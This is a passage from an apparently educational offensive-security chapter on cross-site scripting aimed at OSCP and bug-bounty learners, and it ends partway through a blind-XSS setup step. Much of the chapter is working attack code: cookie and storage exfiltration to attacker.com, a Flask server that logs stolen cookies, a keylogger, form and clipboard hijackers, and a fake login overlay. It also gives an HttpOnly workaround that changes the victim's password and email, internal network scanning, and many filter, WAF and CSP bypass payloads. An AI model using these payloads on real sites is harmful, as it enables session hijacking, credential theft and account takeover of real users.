
# XSS & Client-Side Attacks: Controlling the Browser

> **Executive Summary**: Cross-Site Scripting (XSS) is not just "popping alert boxes"—it's complete control over a victim's browser session. XSS enables session hijacking, credential theft, keylogging, phishing, internal network scanning, and complete account takeover. Often underestimated as "low severity," XSS is actually one of the most versatile attack vectors, enabling attackers to bypass same-origin policy, steal sensitive data, and perform actions on behalf of authenticated users. This chapter covers all XSS types, advanced exploitation techniques, filter bypasses, CSP evasion, and real-world OSCP scenarios.

**What You'll Learn**:
- Complete XSS fundamentals (Reflected, Stored, DOM)
- Advanced exploitation techniques
- Filter and WAF bypass methods
- CSP (Content Security Policy) bypass
- Cookie theft and session hijacking
- Keylogging and credential harvesting
- BeEF framework mastery
- Mutation XSS and mXSS
- Polyglot payloads
- Blind XSS techniques
- OSCP-relevant scenarios
- 30+ exploitation examples

---

## Table of Contents

1. [What is XSS? (ABSOLUTE BEGINNER)](#1-what-is-xss)
2. [XSS Types: Reflected, Stored, DOM](#2-xss-types)
3. [Impact and Real-World Consequences](#3-impact-and-real-world-consequences)
4. [Basic XSS Exploitation](#4-basic-xss-exploitation)
5. [Cookie Theft and Session Hijacking](#5-cookie-theft-and-session-hijacking)
6. [Keylogging and Credential Harvesting](#6-keylogging-and-credential-harvesting)
7. [Filter Bypass Techniques](#7-filter-bypass-techniques)
8. [WAF Evasion](#8-waf-evasion)
9. [Content Security Policy (CSP)](#9-content-security-policy-csp)
10. [CSP Bypass Techniques](#10-csp-bypass-techniques)
11. [DOM-Based XSS Deep Dive](#11-dom-based-xss-deep-dive)
12. [Mutation XSS (mXSS)](#12-mutation-xss-mxss)
13. [Polyglot Payloads](#13-polyglot-payloads)
14. [Blind XSS](#14-blind-xss)
15. [BeEF Framework](#15-beef-framework)
16. [XSS to Account Takeover](#16-xss-to-account-takeover)
17. [OSCP Scenarios](#17-oscp-scenarios)
18. [Defense Strategies](#18-defense-strategies)
19. [Common Pitfalls](#19-common-pitfalls)
20. [Interview Questions](#20-interview-questions)

---

## 1. What is XSS? (ABSOLUTE BEGINNER)

### 1.1 XSS Fundamentals

**ABSOLUTE BEGINNER**: XSS (Cross-Site Scripting) is when an attacker injects malicious JavaScript that runs in a victim's browser.

**Simple Explanation**:
```
Normal Website Behavior:
1. You visit website.com
2. Website sends HTML: <h1>Welcome!</h1>
3. Your browser displays: Welcome!


With XSS:
1. Attacker tricks website to include their code
2. Website sends: <h1>Welcome!</h1><script>steal_cookies()</script>
3. Your browser runs the malicious script
4. Your cookies/data sent to attacker
```

**Why "Cross-Site"?**
```
The malicious script runs in the context of a TRUSTED site,
but was injected by an UNTRUSTED attacker.

Browser thinks: "This script is from bank.com (trusted)"
Reality: Script was injected by attacker
Result: Script has full access to bank.com data
```

### 1.2 The Same-Origin Policy Problem

**ABSOLUTE BEGINNER**: Browsers have a security rule called Same-Origin Policy.

**Same-Origin Policy**:
```
Rule: JavaScript on site A cannot access data from site B

Example:
- Script on evil.com CANNOT read cookies from bank.com
- This protects your bank account

BUT with XSS:
- Script runs IN THE CONTEXT of bank.com
- Browser thinks: "This script is from bank.com"
- Script CAN read bank.com cookies
- XSS bypasses Same-Origin Policy!
```

**ASCII Diagram**:
```
Without XSS (Protected):
┌──────────┐                    ┌──────────┐
│evil.com  │ ──X─ Cannot read ─>│bank.com  │
│JavaScript│     bank.com data  │ cookies  │
└──────────┘                    └──────────┘
          Same-Origin Policy blocks


With XSS (Bypassed):
┌──────────┐                    ┌──────────┐
│bank.com  │                    │bank.com  │
│ page     │ ← Injected script →│ cookies  │
└──────────┘     runs here!     └──────────┘
                      ↓
              ┌──────────────┐
              │ evil.com     │
              │ (receives    │
              │  stolen data)│
              └──────────────┘
```

### 1.3 Why XSS is Dangerous

**Common Misconception**: "It's just an alert box, low severity"

**Reality - XSS Enables**:
```
1. Session Hijacking
   - Steal cookies → impersonate victim

2. Credential Theft
   - Inject fake login form on trusted site

3. Keylogging
   - Record everything victim types

4. Defacement
   - Change page content

5. Phishing
   - Show fake messages on real site

6. Internal Network Scanning
   - Use victim's browser to scan their network

7. Malware Distribution
   - Force downloads

8. Account Takeover
   - Change password, email, settings

9. Privilege Escalation
   - If victim is admin → full site control

10. CSRF Amplification
    - Perform any action as the victim
```

---

## 2. XSS Types

### 2.1 Reflected XSS (Non-Persistent)

**ABSOLUTE BEGINNER**: Payload is in the URL, reflected immediately.

**How It Works**:
```
Step 1: Attacker crafts malicious URL
https://target.com/search?q=<script>alert(1)</script>

Step 2: Attacker sends link to victim (phishing email, forum post)

Step 3: Victim clicks link

Step 4: Server reflects payload in response:
<h1>Search results for: <script>alert(1)</script></h1>

Step 5: Browser executes script
```

**Real Example**:
```php
<?php
// Vulnerable code:
echo "Search results for: " . $_GET['q'];
?>

// URL: /search.php?q=<script>alert(document.cookie)</script>
// Output: Search results for: <script>alert(document.cookie)</script>
// Browser executes the script!
```

**Characteristics**:
- ✓ Immediate execution
- ✓ Requires victim interaction (click link)
- ✓ Not stored in database
- ✓ Affects only users who click the link
- ✗ Lower impact than Stored XSS

**Attack Scenario**:
```
1. Attacker finds XSS in search function
2. Crafts URL: https://bank.com/search?q=<script src=http://evil.com/steal.js></script>
3. Sends phishing email: "Click here to see your statement"
4. Victim clicks → script steals session → attacker logs in as victim
```

### 2.2 Stored XSS (Persistent)

**ABSOLUTE BEGINNER**: Payload is stored in database, affects everyone who views it.

**How It Works**:
```
Step 1: Attacker submits malicious input
Comment: <script>alert(1)</script>

Step 2: Server stores in database
INSERT INTO comments (text) VALUES ('<script>alert(1)</script>')

Step 3: Any user views the page

Step 4: Server retrieves from database and displays:
<div class="comment"><script>alert(1)</script></div>

Step 5: Script executes for EVERY visitor
```

**Real Example**:
```php
<?php
// Vulnerable code:
$comments = db_query("SELECT * FROM comments");
foreach ($comments as $comment) {
    echo "<div>" . $comment['text'] . "</div>";
}
?>

// Attacker posts comment: <script>steal_cookies()</script>
// Every visitor's cookies stolen!
```

**Characteristics**:
- ✓ Persistent (stored in DB)
- ✓ Affects all users who view the page
- ✓ No user interaction required (auto-executes)
- ✓ Higher impact (especially if admin views)
- ✓ Wormable (can self-propagate)

**High-Impact Targets**:
```
1. Comment sections
2. User profiles (bio, username)
3. Forum posts
4. Product reviews
5. Support tickets (admin will view!)
6. Chat messages
7. File names (uploaded files)
8. Error logs (admin panel)
```

**Attack Scenario**:
```
1. Attacker posts comment with XSS payload
2. Admin views comments in admin panel
3. Script steals admin session cookie
4. Attacker uses cookie to log in as admin
5. Full site compromise
```

### 2.3 DOM-Based XSS

**ABSOLUTE BEGINNER**: Vulnerability is in client-side JavaScript, not server code.

**How It Works**:
```
Server sends clean HTML:
<div id="message"></div>
<script>
  var msg = location.hash.substring(1);  // Read from URL
  document.getElementById('message').innerHTML = msg;  // Unsafe!
</script>

Attacker's URL:
https://target.com/#<img src=x onerror=alert(1)>

Browser:
1. Loads page
2. JavaScript reads location.hash
3. Sets innerHTML with unsanitized input
4. Browser renders <img> tag
5. onerror fires → XSS!
```

**Key Difference**:
```
Reflected/Stored XSS:
- Server sends malicious HTML
- Server-side vulnerability

DOM XSS:
- Server sends clean HTML
- Client-side JavaScript creates vulnerability
- Payload may never touch the server!
```

**Vulnerable JavaScript Patterns**:
```javascript
// VULNERABLE: innerHTML
element.innerHTML = userInput;

// VULNERABLE: document.write
document.write(userInput);

// VULNERABLE: eval
eval(userInput);

// VULNERABLE: outerHTML
element.outerHTML = userInput;

// VULNERABLE: insertAdjacentHTML
element.insertAdjacentHTML('beforebegin', userInput);

// VULNERABLE: location.href assignment
location.href = userInput;  // javascript:alert(1)
```

**Sources (User-Controlled Input)**:
```javascript
// URL-based:
location.href
location.hash
location.search
document.URL
document.referrer

// Other sources:
window.name
localStorage
sessionStorage
document.cookie
```

**Sinks (Dangerous Functions)**:
```javascript
// Execution sinks:
eval()
setTimeout()
setInterval()
Function()

// HTML sinks:
element.innerHTML
document.write()
element.outerHTML

// Navigation sinks:
location.href
location.assign()
```

**Real Example**:
```html
<!-- Vulnerable page -->
<script>
  // Read search term from URL hash
  var search = location.hash.slice(1);
  // Display search term
  document.getElementById('result').innerHTML = "You searched for: " + search;
</script>

<!-- Attack -->
URL: https://target.com/#<img src=x onerror=alert(document.cookie)>
```

**Why DOM XSS is Sneaky**:
```
1. WAF might not see it (payload in URL fragment after #)
2. Server logs might not capture it
3. Harder to detect with automated scanners
4. Requires JavaScript analysis
```

---

## 3. Impact and Real-World Consequences

### 3.1 Session Hijacking

**ABSOLUTE BEGINNER**: Stealing cookies to impersonate victim.

**The Attack**:
```javascript
// Attacker's payload:
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

// What happens:
1. Victim's browser executes script
2. Script reads cookies: session=abc123
3. Sends to attacker's server
4. Attacker sets cookie in their browser
5. Attacker is now logged in as victim
```

**Real-World Impact**:
```
Target: Banking website
XSS Location: Support ticket system

Attack:
1. Attacker submits ticket with XSS payload
2. Bank employee opens ticket in admin panel
3. Employee's admin session cookie stolen
4. Attacker logs in as admin
5. Access to all customer accounts
```

### 3.2 Credential Harvesting

**Fake Login Form**:
```html
<script>
// Inject fake login form on top of real page
document.body.innerHTML = `
  <div style="position:fixed; top:0; left:0; width:100%; height:100%; 
              background:white; z-index:9999;">
    <h1>Session Expired - Please Login Again</h1>
    <form action="https://attacker.com/phish" method="POST">
      Username: <input name="user"><br>
      Password: <input type="password" name="pass"><br>
      <input type="submit" value="Login">
    </form>
  </div>
`;
</script>
```

**Victim's Perspective**:
```
1. Browsing bank.com (trusted site)
2. Page suddenly shows "Session Expired"
3. Login form looks legitimate (same domain!)
4. Victim enters credentials
5. Credentials sent to attacker
6. Attacker redirects to real login page
7. Victim logs in again, thinks it was just a glitch
```

### 3.3 Keylogging

**Complete Keystroke Capture**:
```javascript
<script>
document.onkeypress = function(e) {
  var key = e.key || String.fromCharCode(e.keyCode);
  
  // Send every keystroke to attacker
  fetch('https://attacker.com/log', {
    method: 'POST',
    body: JSON.stringify({
      key: key,
      url: location.href,
      timestamp: Date.now()
    })
  });
};
</script>
```

**What Gets Captured**:
- Passwords typed into forms
- Credit card numbers
- SSN, personal information
- Private messages
- Everything the victim types on that page

### 3.4 Internal Network Reconnaissance

**Using Victim's Browser as Pivot**:
```javascript
<script>
// Scan internal network from victim's browser
var internal_ips = [];
for (var i = 1; i <= 254; i++) {
  var ip = '192.168.1.' + i;
  
  // Try to load image from internal IP
  var img = new Image();
  img.onload = function() {
    // Host is up!
    fetch('https://attacker.com/report', {
      method: 'POST',
      body: JSON.stringify({ip: this.src})
    });
  };
  img.src = 'http://' + ip + ':80/favicon.ico?' + Date.now();
}
</script>
```

**Why This Works**:
```
Victim's browser is INSIDE their corporate network
Browser can access:
- Internal web applications
- Admin panels on 192.168.x.x
- Corporate intranet
- Development servers
- IoT devices

Attacker's external server CANNOT access these
But attacker's JavaScript running in victim's browser CAN!
```

### 3.5 Defacement

**Complete Page Replacement**:
```javascript
<script>
document.body.innerHTML = '<h1>HACKED BY ATTACKER</h1><img src="skull.jpg">';
</script>
```

**Impact**:
- Brand damage
- Loss of customer trust
- Stock price impact (for public companies)
- Regulatory scrutiny

---

## 4. Basic XSS Exploitation

### 4.1 Detection Techniques

**Step 1: Inject Test Strings**:
```
Test inputs:
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
'"><script>alert(1)</script>
javascript:alert(1)
```

**Step 2: Check Reflection**:
```
View page source:
- Is input reflected?
- Is it encoded?
- Where is it reflected? (HTML, attribute, JavaScript)
```

**Step 3: Identify Context**:
```html
<!-- Context 1: HTML Body -->
<div>USER_INPUT</div>
Payload: <script>alert(1)</script>

<!-- Context 2: HTML Attribute -->
<input value="USER_INPUT">
Payload: "><script>alert(1)</script>

<!-- Context 3: JavaScript -->
<script>var x = 'USER_INPUT';</script>
Payload: '; alert(1); //

<!-- Context 4: Event Handler -->
<div onclick="doSomething('USER_INPUT')">
Payload: '); alert(1); //
```

### 4.2 Context-Specific Payloads

**HTML Context**:
```html
<!-- Simple script tag -->
<script>alert(document.domain)</script>

<!-- Image with error handler -->
<img src=x onerror=alert(1)>

<!-- SVG with onload -->
<svg onload=alert(1)>

<!-- Details with ontoggle -->
<details open ontoggle=alert(1)>

<!-- Body with onload -->
<body onload=alert(1)>
```

**Attribute Context**:
```html
<!-- Break out of attribute -->
<input value="INJECT">
Payload: " onmouseover="alert(1)

Result: <input value="" onmouseover="alert(1)">

<!-- Alternative -->
Payload: " autofocus onfocus="alert(1)
Result: <input value="" autofocus onfocus="alert(1)">
```

**JavaScript String Context**:
```javascript
// Original code
<script>var greeting = 'Hello USER_INPUT';</script>

// Payload
'; alert(1); //

// Result
<script>var greeting = 'Hello '; alert(1); //';</script>
```

**Event Handler Context**:
```html
<!-- Original -->
<a href="#" onclick="search('USER_INPUT')">Search</a>

// Payload
'); alert(1); //

// Result
<a href="#" onclick="search(''); alert(1); //')">Search</a>
```

### 4.3 Proof of Concept (PoC) Payloads

**For Bug Bounties / Pentests**:
```javascript
// Show domain (proves XSS execution)
<script>alert(document.domain)</script>

// Show cookie
<script>alert(document.cookie)</script>

// Show current user
<script>alert(document.querySelector('username-element').textContent)</script>

// Fetch external resource (proves outbound connection)
<script src=//attacker.com/test.js></script>

// Visual proof (screenshot-friendly)
<h1 style="position:fixed;top:0;left:0;width:100%;background:red;color:white;z-index:9999;">XSS by RESEARCHER_NAME</h1>
```

---

## 5. Cookie Theft and Session Hijacking

### 5.1 Basic Cookie Theft

**Simple Image-Based Exfiltration**:
```javascript
<script>
  var img = new Image();
  img.src = 'https://attacker.com/steal?cookie=' + document.cookie;
</script>
```

**What Happens**:
```
1. Script creates new Image object
2. Sets source to attacker's server with cookie in URL
3. Browser sends GET request to attacker.com
4. Attacker's server logs the cookie
```

**Attacker's Server (Receive Cookies)**:
```python
# Simple Flask server
from flask import Flask, request
app = Flask(__name__)

@app.route('/steal')
def steal():
    cookie = request.args.get('cookie')
    ip = request.remote_addr
    
    # Log stolen cookie
    with open('stolen.txt', 'a') as f:
        f.write(f"IP: {ip} | Cookie: {cookie}\n")
    
    return '', 204  # No content

app.run(host='0.0.0.0', port=80)
```

### 5.2 Advanced Cookie Theft

**Using Fetch API** (More Reliable):
```javascript
<script>
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    cookie: document.cookie,
    url: location.href,
    user_agent: navigator.userAgent,
    referrer: document.referrer
  })
});
</script>
```

**Exfiltrate All Storage**:
```javascript
<script>
var data = {
  cookies: document.cookie,
  localStorage: JSON.stringify(localStorage),
  sessionStorage: JSON.stringify(sessionStorage),
  url: location.href
};

fetch('https://attacker.com/steal', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify(data)
});
</script>
```

### 5.3 HttpOnly Bypass (When Cookies Can't Be Read)

**ABSOLUTE BEGINNER**: HttpOnly flag prevents JavaScript from reading cookies.

**What HttpOnly Does**:
```javascript
// If cookie has HttpOnly flag:
document.cookie  // Returns: "" (empty, cookie hidden)

// Cookie is still sent with requests
// But JavaScript cannot read it
```

**Bypass Strategy: Don't Steal, Use!**
```javascript
// Can't read cookie, but can USE it to make requests
<script>
// Perform actions as the victim
fetch('/api/change-password', {
  method: 'POST',
  credentials: 'include',  // Include cookies automatically
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    new_password: 'hacked123'
  })
});

// Change email
fetch('/api/change-email', {
  method: 'POST',
  credentials: 'include',
  body: JSON.stringify({email: 'attacker@evil.com'})
});

// Report success to attacker
fetch('https://attacker.com/report', {
  method: 'POST',
  body: 'Account compromised'
});
</script>
```

---

## 6. Keylogging and Credential Harvesting

### 6.1 Comprehensive Keylogger

```javascript
<script>
var keys = '';
var sendInterval = 5000;  // Send every 5 seconds

document.addEventListener('keypress', function(e) {
  var key = e.key || String.fromCharCode(e.keyCode);
  keys += key;
});

// Send captured keys periodically
setInterval(function() {
  if (keys.length > 0) {
    fetch('https://attacker.com/keys', {
      method: 'POST',
      body: JSON.stringify({
        keys: keys,
        url: location.href,
        time: new Date().toISOString()
      })
    });
    keys = '';  // Reset buffer
  }
}, sendInterval);
</script>
```

### 6.2 Form Hijacking

**Intercept Form Submissions**:
```javascript
<script>
// Find all forms
document.querySelectorAll('form').forEach(function(form) {
  form.addEventListener('submit', function(e) {
    e.preventDefault();  // Stop normal submission
    
    // Extract form data
    var formData = new FormData(form);
    var data = {};
    formData.forEach((value, key) => {data[key] = value});
    
    // Send to attacker
    fetch('https://attacker.com/formdata', {
      method: 'POST',
      body: JSON.stringify(data)
    });
    
    // Then submit normally (victim doesn't notice)
    setTimeout(() => form.submit(), 100);
  });
});
</script>
```

### 6.3 Clipboard Hijacking

**Steal Clipboard Content**:
```javascript
<script>
document.addEventListener('paste', function(e) {
  var clipboardData = e.clipboardData || window.clipboardData;
  var pastedData = clipboardData.getData('text');
  
  // Send to attacker
  fetch('https://attacker.com/clipboard', {
    method: 'POST',
    body: JSON.stringify({
      data: pastedData,
      url: location.href
    })
  });
});
</script>
```

---

## 7. Filter Bypass Techniques

### 7.1 Tag-Based Bypasses

**When `<script>` is Blocked**:
```html
<!-- Image -->
<img src=x onerror=alert(1)>

<!-- SVG -->
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>

<!-- Body -->
<body onload=alert(1)>

<!-- Details -->
<details open ontoggle=alert(1)>

<!-- Iframe -->
<iframe src="javascript:alert(1)">

<!-- Object -->
<object data="javascript:alert(1)">

<!-- Embed -->
<embed src="javascript:alert(1)">

<!-- Form -->
<form><button formaction="javascript:alert(1)">X</button></form>

<!-- Input -->
<input autofocus onfocus=alert(1)>

<!-- Marquee -->
<marquee onstart=alert(1)>

<!-- Select -->
<select onfocus=alert(1) autofocus>

<!-- Textarea -->
<textarea autofocus onfocus=alert(1)>
```

### 7.2 Case Variation

```html
<!-- Uppercase -->
<SCRIPT>alert(1)</SCRIPT>

<!-- Mixed case -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Random case -->
<sCrIpT>alert(1)</ScRiPt>

<!-- Event handlers -->
<img src=x oNeRrOr=alert(1)>
```

### 7.3 Encoding Bypasses

**HTML Encoding**:
```html
<!-- Decimal entities -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
                    a    l    e    r    t    (   1   )

<!-- Hex entities -->
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>

<!-- Mixed -->
<img src=x onerror=&#97;l&#101;r&#116;(1)>
```

**URL Encoding**:
```html
<!-- %20 = space -->
<img%20src=x%20onerror=alert(1)>

<!-- Double encoding -->
<img%2520src=x%2520onerror=alert(1)>
```

**Unicode**:
```javascript
<!-- JavaScript Unicode escape -->
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
           a     l     e     r     t

<!-- UTF-7 (old IE) -->
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

### 7.4 Comment Insertion

```html
<!-- Comments inside tags -->
<scr<!--comment-->ipt>alert(1)</scr<!---->ipt>

<!-- Null bytes (some parsers) -->
<scri%00pt>alert(1)</scri%00pt>

<!-- Newlines -->
<scri
pt>alert(1)</scri
pt>
```

### 7.5 Alternative Event Handlers

**100+ Event Handlers** (when common ones blocked):
```html
onload, onerror, onclick, onmouseover, onfocus, onblur,
onchange, onsubmit, onkeydown, onkeyup, onkeypress,
onmouseenter, onmouseleave, onpaste, oncopy, oncut,
ondrag, ondrop, onwheel, onscroll, onresize, ontoggle,
oncontextmenu, ondblclick, onmousedown, onmouseup,
onpointerover, onpointerenter, onpointerdown, onpointerup,
onanimationstart, onanimationend, ontransitionend,
onseeked, onseeking, ontimeupdate, onvolumechange,
onwaiting, onloadeddata, onloadedmetadata, oncanplay,
oncanplaythrough, ondurationchange, onemptied, onended,
onloadstart, onpause, onplay, onplaying, onprogress,
onratechange, onstalled, onsuspend, ...
```

**Examples**:
```html
<body onpageshow=alert(1)>
<body onbeforeprint=alert(1)>
<body onafterprint=alert(1)>
<body onhashchange=alert(1)>
<body onpopstate=alert(1)>
<body onstorage=alert(1)>
<body onoffline=alert(1)>
<body ononline=alert(1)>
```

### 7.6 Obfuscation

**JSFuck** (JavaScript using only 6 characters: `[]()!+`):
```javascript
// alert(1) in JSFuck:
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]
```

**Base64**:
```html
<script>eval(atob('YWxlcnQoMSk='))</script>
<!-- Decodes to: alert(1) -->
```

**String Concatenation**:
```javascript
<script>eval('al'+'ert'+'(1)')</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

---

## 8. WAF Evasion

### 8.1 WAF Detection

**Identifying WAF**:
```bash
# Using wafw00f:
wafw00f https://target.com

# Manual test - send obvious payload:
curl "https://target.com/?x=<script>alert(1)</script>"

# If blocked:
# - Status 403
# - Generic error page
# - "Request blocked" message
# - WAF vendor mentioned

# Confirms WAF presence
```

### 8.2 WAF Bypass Techniques

**Technique 1: Alternative Syntax**:
```html
<!-- Instead of <script>alert(1)</script> -->

<svg/onload=alert(1)>
<img/src/onerror=alert(1)>
<iframe/src=javascript:alert(1)>
<body/onload=alert(1)>
```

**Technique 2: Case Randomization**:
```html
<ScRiPt>alert(1)</sCrIpT>
<img SrC=x OnErRoR=alert(1)>
```

**Technique 3: Event Handler Variation**:
```html
<!-- If onerror blocked, try: -->
<img src=x onload=alert(1)>
<img src=x onclick=alert(1)>
<img src=x onmouseover=alert(1)>
<img src=x onfocus=alert(1)>
```

**Technique 4: Newlines and Tabs**:
```html
<img	src=x	onerror=alert(1)>
<img
src=x
onerror=alert(1)>
```

**Technique 5: HTML Comments**:
```html
<img src=x o<!---->nerror=alert(1)>
<scr<!---->ipt>alert(1)</scr<!---->ipt>
```

**Technique 6: Encoding**:
```html
<!-- HTML entities -->
<img src=x onerror=&#97;lert(1)>

<!-- URL encoding -->
<img src=x onerror=%61lert(1)>
```

**Technique 7: Polyglots** (work in multiple contexts):
```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### 8.3 Cloudflare Bypass Example

```html
<!-- Blocked -->
<script>alert(1)</script>

<!-- Bypasses -->
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<img src onerror=alert(1)>
<iframe src="data:text/html,<script>alert(1)</script>">
```

---

## 9. Content Security Policy (CSP)

### 9.1 What is CSP?

**ABSOLUTE BEGINNER**: CSP is an HTTP header that tells the browser what JavaScript can run.

**How CSP Works**:
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com

Meaning:
- default-src 'self' = Only load resources from same origin
- script-src 'self' https://trusted.com = JavaScript only from same origin or trusted.com

Blocks:
- Inline scripts: <script>alert(1)</script>
- External scripts: <script src="https://evil.com/malicious.js"></script>
- javascript: URLs
- eval()
```

### 9.2 CSP Directives

**Common Directives**:
```
default-src:     Fallback for other directives
script-src:      JavaScript sources
style-src:       CSS sources
img-src:         Image sources
connect-src:     Fetch, XHR, WebSocket sources
font-src:        Font sources
object-src:      <object>, <embed>, <applet> sources
media-src:       <audio>, <video> sources
frame-src:       <iframe> sources
```

**Values**:
```
'none':          Block everything
'self':          Same origin only
'unsafe-inline': Allow inline scripts (BAD!)
'unsafe-eval':   Allow eval() (BAD!)
https:           HTTPS sources only
https://cdn.com: Specific domain
```

**Example Policies**:

**Strict CSP** (Blocks XSS):
```http
Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self'
```

**Weak CSP** (Easily bypassed):
```http
Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval' *
```

### 9.3 CSP Effectiveness

**Strong CSP** (XSS Prevention):
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'

Blocks:
✗ <script>alert(1)</script>  (inline script)
✗ <img src=x onerror=alert(1)>  (inline event handler)
✗ <script src=https://evil.com/x.js></script>  (external domain)
✗ javascript:alert(1)  (javascript: protocol)
✗ eval('alert(1)')  (eval blocked)

Allows:
✓ <script src="/app.js"></script>  (same origin)
```

---

## 10. CSP Bypass Techniques

### 10.1 Exploiting 'unsafe-inline'

**If CSP allows 'unsafe-inline'**:
```http
Content-Security-Policy: script-src 'self' 'unsafe-inline'
```

**Bypass (Trivial)**:
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

### 10.2 Exploiting 'unsafe-eval'

**If CSP allows 'unsafe-eval'**:
```http
Content-Security-Policy: script-src 'self' 'unsafe-eval'
```

**Bypass**:
```html
<script>eval('alert(1)')</script>
<script>setTimeout('alert(1)', 0)</script>
<script>setInterval('alert(1)', 1000)</script>
<script>Function('alert(1)')()</script>
```

### 10.3 JSONP Endpoints

**If CSP allows specific domains with JSONP**:
```http
Content-Security-Policy: script-src 'self' https://www.google.com
```

**Many Google endpoints support JSONP**:
```html
<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1)"></script>
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
```

**Other Common JSONP Endpoints**:
```
https://www.google.com/complete/search?client=chrome&jsonp=CALLBACK
https://www.bing.com/search?format=json&jsonp=CALLBACK
https://api.flickr.com/services/rest/?jsonp=CALLBACK
https://vimeo.com/api/oembed.json?callback=CALLBACK
```

### 10.4 Dangling Markup Injection

**When script-src is strict but other directives are weak**:
```http
Content-Security-Policy: script-src 'self'; default-src *
```

**Exfiltrate Data via Images**:
```html
<img src='https://attacker.com/steal?data=
<style>
@import url('https://attacker.com/steal?data=
```

**Browser includes everything up to closing quote**:
```html
<img src='https://attacker.com/steal?data=
SECRET_TOKEN_HERE
OTHER_PAGE_CONTENT
'>
```

### 10.5 Base Tag Injection

**If relative script paths used**:
```html
<!-- Original page -->
<script src="/js/app.js"></script>

<!-- Injected base tag -->
<base href="https://attacker.com/">

<!-- Browser loads -->
<script src="https://attacker.com/js/app.js"></script>
```

**Payload**:
```html
<base href="https://attacker.com/">
```

### 10.6 Service Worker

**If CSP doesn't restrict workers**:
```javascript
// Register malicious service worker
<script>
navigator.serviceWorker.register('//attacker.com/sw.js');
</script>
```

**Service worker can intercept all requests**!

---

## 11. DOM-Based XSS Deep Dive

### 11.1 Finding DOM XSS

**Look for Dangerous Patterns**:
```javascript
// Sinks (dangerous functions):
element.innerHTML = source;
element.outerHTML = source;
document.write(source);
eval(source);
setTimeout(source, ...);
setInterval(source, ...);
location.href = source;

// Sources (user-controlled):
location.href
location.hash
location.search
document.URL
document.referrer
```

**Example Vulnerable Code**:
```javascript
// Read from URL hash
var userInput = location.hash.substring(1);

// Write to innerHTML (SINK)
document.getElementById('output').innerHTML = userInput;

// Attack: https://target.com/#<img src=x onerror=alert(1)>
```

### 11.2 DOM XSS Tools

**DOM Invader** (Burp Suite Extension):
- Automatically identifies sources and sinks
- Tests for DOM XSS
- Highlights vulnerable code

**Manual Testing**:
```javascript
// Test payloads in URL hash:
#<img src=x onerror=alert(1)>
#'><img src=x onerror=alert(1)>
#"><img src=x onerror=alert(1)>

// Test in URL parameters:
?x=<img src=x onerror=alert(1)>

// Test in window.name:
<script>window.name='<img src=x onerror=alert(1)>'</script>
```

---

## 12. Mutation XSS (mXSS)

### 12.1 What is mXSS?

**ABSOLUTE BEGINNER**: Browser mutates/changes HTML after sanitization, creating XSS.

**How It Works**:
```
Step 1: Sanitizer checks input (safe)
Step 2: Browser parses HTML (mutation occurs)
Step 3: Mutation creates executable JavaScript (XSS!)
```

**Example**:
```html
<!-- Input (looks safe) -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- After sanitization (still safe) -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- After browser parsing (MUTATED) -->
<noscript><p title="</noscript>
<img src=x onerror=alert(1)>

<!-- XSS executed! -->
```

### 12.2 mXSS Techniques

**Technique 1: Backslash Newline**:
```html
<style><img src=x onerror=alert(1)></style>
<!-- Sanitizer blocks -->

<style><img src=x onerror=alert(1)//</style>
<!-- Browser removes </style>, script executes -->
```

**Technique 2: HTML + SVG Namespace Confusion**:
```html
<svg><style><img src=x onerror=alert(1)></style></svg>
```

---

## 13. Polyglot Payloads

### 13.1 What are Polyglots?

**ABSOLUTE BEGINNER**: A single payload that works in multiple contexts.

**Contexts**:
- HTML body
- HTML attribute
- JavaScript string
- URL

**Example Polyglot**:
```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

**Why Polyglots?**
```
When you don't know the context, use a polyglot!

Works in:
- HTML: </stYle/</titLe/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()
- Attribute: " oNcliCk=alert()
- JavaScript: '; alert(); //
- URL: jaVasCript:alert()
```

---

## 14. Blind XSS

### 14.1 What is Blind XSS?

**ABSOLUTE BEGINNER**: XSS that executes later in a place you can't see (admin panel, logs, etc.).

**Scenario**:
```
1. You inject XSS into support ticket
2. You can't see admin panel
3. Admin opens ticket → XSS fires
4. You receive notification
```

**Blind XSS Targets**:
- Support tickets
- User-Agent in logs
- Referrer in analytics
- Contact forms
- Survey responses
- Error reports

### 14.2 XSS Hunter / ezXSS

**Automated Blind XSS Detection**:
```html
<!-- Payload -->
"><script src=https://your-xss-hunter.com/YOUR_ID></script>

<!-- When executed, sends you -->
- Screenshot of page
- Cookies
- URL
- DOM
- User-Agent
- IP address
- Timestamp
```

**Setup Your Own XSS Hunter**:
```bash
# Clone ezXSS
